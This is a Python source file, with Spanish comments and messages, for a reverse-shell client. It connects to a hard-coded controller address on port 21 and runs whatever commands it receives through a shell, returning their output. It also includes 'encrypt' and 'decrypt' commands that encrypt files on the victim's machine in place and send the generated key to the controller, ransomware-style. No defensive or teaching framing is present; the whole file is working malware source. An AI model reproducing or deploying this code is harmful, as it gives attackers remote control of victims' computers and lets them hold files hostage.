import socket
import subprocess
import os
import base64
from cryptography.fernet import Fernet


# Función para cifrar un archivo
def encrypt_file(file_path, key):
    try:
        if not os.path.exists(file_path):
            return f"Error: El archivo '{file_path}' no existe."
        fernet = Fernet(key)
        with open(file_path, "rb") as file:
            original = file.read()
        encrypted = fernet.encrypt(original)
        with open(file_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted)
        return f"'{file_path}' éxito."
    except Exception as e:
        return f"Error al cifrar el archivo: {str(e)}"

def decrypt_file(file_path, key):
    try:
        fernet = Fernet(key)
        with open(file_path, "rb") as encrypted_file:
            encrypted = encrypted_file.read()
        decrypted = fernet.decrypt(encrypted)
        with open(file_path, "wb") as decrypted_file:
            decrypted_file.write(decrypted)
        return f"{file_path}' éxito."
    except Exception as e:
        return f"Error al descifrar el archivo: {str(e)}"

HOST = '192.168.1.138'
PORT = 21

try:
    # Crear el socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"Intentando conectar a {HOST}:{PORT}...")
    client.connect((HOST, PORT))
    print(f"Conexión establecida con el servidor en {HOST}:{PORT}")

    # Generar una clave aleatoria y enviarla al servidor

    while True:
        
            # Recibir comando del servidor
        try:
            command = client.recv(1024).decode('utf-8')
        except UnicodeDecodeError:
            command = client.recv(1024).decode('windows-1252')


        if command.lower() == "exit":
            print("Cerrando conexión...")
            break

        if command.startswith("encrypt"):
            try:
                key = Fernet.generate_key()
                client.send(key)
                file_path = command.split(" ", 1)[1].strip()
                result = encrypt_file(file_path, key)
            except IndexError:
                result = "Error: No se proporcionó un archivo para cifrar."
            except Exception as e:
                result = f"Error al procesar el comando 'encrypt': {str(e)}"
            client.send(result.encode('utf-8'))
            continue
        if command.startswith("decrypt"):
            try:
                # Separar la clave y la ruta del archivo del comando
                parts = command.split(" ", 2)
                if len(parts) < 3:
                    result = "Error: Comando malformado. Uso: decrypt <key> <file_path>"
                else:
                    key2 = parts[2].strip()  # Convertir la clave a bytes
                    file_path = parts[1].strip()
                    result = decrypt_file(file_path, key2)
            except Exception as e:
                result = f"Error al procesar el comando 'decrypt': {str(e)}"
            client.send(result.encode('utf-8'))
            continue
        else:
            try:
                # Ejecutar otros comandos
                output = subprocess.run(command, shell=True, capture_output=True)
                result = output.stdout + output.stderr
            except Exception as e:
                result = f"Error al ejecutar el comando: {str(e)}".encode('utf-8')

            client.send(result if isinstance(result, bytes) else result.encode('utf-8'))

except Exception as e:
    print(f"Error general en el cliente: {str(e)}")

finally:
    client.close()
    print("Conexión cerrada.")
